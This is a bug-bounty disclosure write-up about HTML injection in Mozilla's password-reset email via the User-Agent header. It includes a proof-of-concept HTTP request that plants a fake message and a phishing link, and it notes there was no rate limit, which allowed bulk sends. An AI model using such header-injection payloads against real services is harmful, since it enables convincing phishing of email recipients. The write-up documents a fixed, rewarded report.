I"å<p>While testing mozilla, I found it was possible to include HTML and plaintext in the password reset email coming from mozilla.
<br /></p>

<p>When resetting password on mozilla, I found mozilla includes browser, OS, and IP in its email notification. They were trying to parse the user-agent string into a readable device description from the request, but when no valid user-agent is provided then whole string is taken as device description and then the string gets inserted into the email without any further sanity checks. This allow us to include HTML content into the email.</p>

<p><strong>POC</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /v1/password/forgot/send_code HTTP/1.1
Host: api.accounts.firefox.com
User-Agent: &lt;br&gt;&lt;br&gt;This is fake message with fake &lt;a href="http://phishing-url.com"&gt;http://phishing-url.com/&lt;/a&gt;&lt;br&gt;&lt;br&gt;
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Referer: https://accounts.firefox.com/
Content-Length: 597
Origin: https://accounts.firefox.com
Connection: close

data...
</code></pre></div></div>

<p><img src="/images/Screenshot_3.png" alt="" /></p>

<p>There wasnâ€™t rate limit on password reset functionality. So, it was possbile to send emails in bulk with relevant DKIM/SPF checks passing.</p>

<p><strong>Timeline</strong></p>

<p>May 24, 2017 - Report Sent<br />
Jun 13, 2017 - Bounty Awarded by Mozilla</p>
:ET